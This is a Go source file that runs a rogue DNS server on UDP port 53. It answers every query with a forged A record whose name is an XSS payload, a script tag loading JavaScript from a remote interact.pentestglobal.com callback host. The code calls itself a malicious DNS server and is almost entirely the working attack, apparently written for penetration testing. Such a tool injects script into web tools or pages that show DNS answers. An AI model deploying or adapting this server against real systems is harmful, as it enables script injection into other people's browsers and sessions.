package main

import (
	"fmt"
	"log"

	"github.com/miekg/dns"
)

const (
	maliciousDomain = "</pre><script/src=https://bpizclpsjkjkpjeojfaba6dbgxx8dh4fy.interact.pentestglobal.com></script>"
	responseIP      = "127.0.0.1" // Required placeholder
)

// handleDNSRequest handles all DNS queries and responds with a malicious A record.
func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	for _, q := range r.Question {
		log.Printf("Received query for: %s", q.Name)

		// Inject the malicious domain as an A record (non-RFC compliant)
		rr, err := dns.NewRR(fmt.Sprintf(`%s A %s`, maliciousDomain, responseIP))
		if err == nil {
			m.Answer = append(m.Answer, rr)
		} else {
			log.Printf("Error creating record: %v", err)
		}
	}

	_ = w.WriteMsg(m)
}

func main() {

	dns.HandleFunc(".", handleDNSRequest)

	server := &dns.Server{
		Addr: "0.0.0.0:53",
		Net:  "udp",
	}

	log.Println("Starting malicious DNS server on :53")
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("Failed to start DNS server: %v", err)
	}
}
